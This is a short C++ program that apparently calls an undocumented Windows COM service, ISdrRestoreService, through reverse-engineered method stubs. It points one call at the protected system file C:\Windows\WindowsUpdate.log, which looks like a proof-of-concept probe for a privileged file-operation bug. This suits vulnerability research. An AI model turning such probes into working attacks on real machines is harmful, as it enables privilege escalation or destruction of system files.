#include<stdio.h>
#include<windows.h>
#include<searchapi.h>

class __declspec(uuid("2af1fe1b-1ec5-4190-bd89-04dfa7ede9ea")) ISdrRestoreService : public IUnknown {
public:
    virtual HRESULT __stdcall Proc3(/* Stack Offset: 4 */ VOID** p0, /* Stack Offset: 8 */ VOID** p1);
    virtual HRESULT __stdcall Proc4(/* Stack Offset: 4 */ VOID** p0, /* Stack Offset: 8 */ VOID** p1);
    virtual HRESULT __stdcall Proc5(/* Stack Offset: 4 */ wchar_t** p0);
    virtual HRESULT __stdcall Proc6(/* Stack Offset: 4 */ wchar_t* p0, /* Stack Offset: 8 */ BYTE p1);
};

ISdrRestoreService* PISdrRestoreService;


int main() {
    CLSID clsid;
    IID iid;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    CLSIDFromString(L"{47135EEA-06B6-4452-8787-4A187C64A47E}", &clsid);
    IIDFromString(L"{2af1fe1b-1ec5-4190-bd89-04dfa7ede9ea}", &iid);

    ISearchRoot* pISearchRoot;

    HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, (LPVOID*)&PISdrRestoreService);
    if (hr != S_OK)
    {
        printf("Create SearchRoot ERROR %x\n", hr);
        getchar();//E_NOINTERFACE
        return 0;
    }
    WCHAR* test = (wchar_t*)L"123";
    PISdrRestoreService->Proc5(&test);
    PISdrRestoreService->Proc6((wchar_t*)L"C:\\Windows\\WindowsUpdate.log", 0);

    getchar();

    CoUninitialize();

    return 0;
}
